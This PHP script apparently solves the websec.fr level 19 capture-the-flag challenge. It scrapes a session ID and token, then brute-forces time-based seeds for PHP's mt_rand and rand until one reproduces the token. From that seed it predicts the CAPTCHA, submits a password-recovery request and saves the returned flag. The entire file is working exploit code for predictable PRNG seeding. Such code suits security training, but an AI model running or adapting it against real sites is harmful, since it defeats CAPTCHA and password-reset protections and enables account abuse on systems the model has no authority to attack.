<?php
error_reporting(0);

function generate_random_text_mt($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[mt_rand() % strlen($chars)];
    }
    return $text;
}

function generate_random_text_rand($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    MT_RAND ATTACK - Testing Mersenne Twister              ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    $current_time = time();
    
    echo "[Round $round] Testing mt_rand vs rand | Token: " . substr($real_token, 0, 12) . "...\n";
    
    // Probar con ambos PRNGs
    for ($offset = -300; $offset <= 300; $offset++) {
        $seed = $current_time + $offset;
        
        // Probar con mt_srand + mt_rand
        mt_srand($seed);
        $test_token_mt = generate_random_text_mt(32);
        
        if ($test_token_mt === $real_token) {
            echo "\n✓✓✓ MATCH WITH MT_RAND! ✓✓✓\n";
            echo "Seed: $seed\n";
            
            mt_srand($seed);
            generate_random_text_mt(32);
            $captcha = generate_random_text_mt(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\nSUCCESS WITH MT_RAND!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
        
        // Probar con srand + rand (método normal)
        srand($seed);
        $test_token_rand = generate_random_text_rand(32);
        
        if ($test_token_rand === $real_token) {
            echo "\n✓✓✓ MATCH WITH RAND! ✓✓✓\n";
            echo "Seed: $seed\n";
            
            srand($seed);
            generate_random_text_rand(32);
            $captcha = generate_random_text_rand(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\nSUCCESS WITH RAND!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
    
    usleep(200000);
}
?>